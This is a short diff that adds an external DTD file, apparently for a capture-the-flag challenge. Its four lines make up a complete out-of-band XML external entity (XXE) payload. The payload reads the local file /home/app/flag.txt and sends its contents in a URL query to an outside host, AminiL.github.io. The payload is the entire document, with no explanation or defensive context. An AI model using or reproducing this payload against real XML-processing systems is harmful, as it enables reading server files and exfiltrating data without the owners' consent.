@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///home/app/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://AminiL.github.io/?x=%file;'>">
+%eval;
+%exfiltrate;
